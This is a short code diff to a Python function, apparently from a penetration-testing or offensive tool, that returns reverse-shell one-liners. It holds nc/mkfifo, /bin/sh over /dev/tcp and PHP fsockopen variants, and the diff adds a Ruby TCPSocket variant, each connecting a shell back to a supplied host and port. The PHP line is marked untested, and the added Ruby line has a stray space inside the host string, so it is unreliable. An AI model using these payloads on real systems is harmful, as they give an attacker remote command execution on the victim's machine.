@@ -26,6 +26,7 @@ def reverse_shell_payload(host, port):
         'nc': """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %(host)s %(port)s >/tmp/f""" % {'host': host, 'port': port},
         'sh': """/bin/sh -i >& /dev/tcp/%(host)s/%(port)s 0>&1""" % {'host': host, 'port': port},
         'php': """php -r '$sock=fsockopen("%(host)s",%(port)s);exec("/bin/sh -i <&3 >&3 2>&3");'""" % {'host': host, 'port': port}, # 未测试
+        'ruby':"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("%(host)s ","%(port)s");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'""" % {'host': host, 'port': port}
     }
     return payload
 
